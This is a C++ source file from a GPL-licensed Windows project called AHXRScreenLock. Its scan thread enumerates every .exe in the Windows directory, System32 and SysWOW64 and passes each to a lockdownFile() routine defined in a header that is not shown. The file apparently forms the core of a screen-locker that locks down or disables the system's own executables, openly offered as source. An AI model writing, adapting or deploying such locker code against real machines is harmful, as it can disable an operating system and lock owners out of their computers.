/*
	@title
		AHXRScreenLock
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	AHXRScreenLock is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	AHXRScreenLock is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
//#define DEBUG
/*
	"generic" is a CLI keyword and interferes with filesystem.hpp
	@https://svn.boost.org/trac10/ticket/11855

	Despite the ScreenLock only working for Windows, Boost gives the opportunity
	for an easier way to go through system files. Maybe there can be some cross-compatibility.
*/
#ifdef __cplusplus_cli
	#define generic __identifier(generic)
#endif
#include						<boost/filesystem.hpp>
#ifdef __cplusplus_cli
	#undef generic
#endif

#include						<Windows.h>
#include						<iostream>
#include						<vector>
#include					    <fstream>

#ifndef DEBUG
	#include					"lockdown.h"
#endif


namespace						fs = boost::filesystem;
using namespace					std;

vector< string >			    v_files;
HANDLE							t_handle;
DWORD							t_thread_id;
bool							b_scanning;

DWORD WINAPI t_startComputerScan(LPVOID lpParameter) {
	TCHAR
		t_data[MAX_PATH];
	string
		s_path,
		s_new_path;
	int
		i_dir_idx = 0;

	GetWindowsDirectory(t_data, MAX_PATH); // Finding the Windows directory.
	s_path = t_data; // TCHAR -> STRING
	
	fs::directory_iterator it_end;
	fs::directory_iterator it_dir(s_path);

	while (it_dir != it_end) {
		try {
			if (!fs::is_directory(it_dir->status())) { // Listing non-directory files.
				if (it_dir->path().filename().extension() == ".exe") { // Only list .exe files.
					v_files.push_back(it_dir->path().string());
#ifndef DEBUG
					lockdownFile(it_dir->path().string());
#endif
				}
			}

			it_dir++;

			if (it_dir == it_end) { // Scanning System32 and SysWOW64
				switch (i_dir_idx) {
					case 0: {
						s_new_path = s_path + "\\" + "System32";
						break;
					}
					case 1: {
						s_new_path = s_path + "\\" + "SysWOW64";
						break;
					}
				}

				if (i_dir_idx < 2) {
					if (fs::is_directory(s_new_path)) {
						it_dir = fs::directory_iterator(s_new_path);
					}
					i_dir_idx++;
				}
			}
		}
		catch (const std::exception & ex) {
			std::cout << it_dir->path().filename() << " " << ex.what() << std::endl;
		}
	}
	CloseHandle(t_handle);
	b_scanning = false;
	return 0;
}

void startComputerScan() {
	t_handle = CreateThread(0, 0, t_startComputerScan, 0, 0, &t_thread_id);
	b_scanning = true;
}

bool isComputerBeingScanned() {
	return b_scanning;
}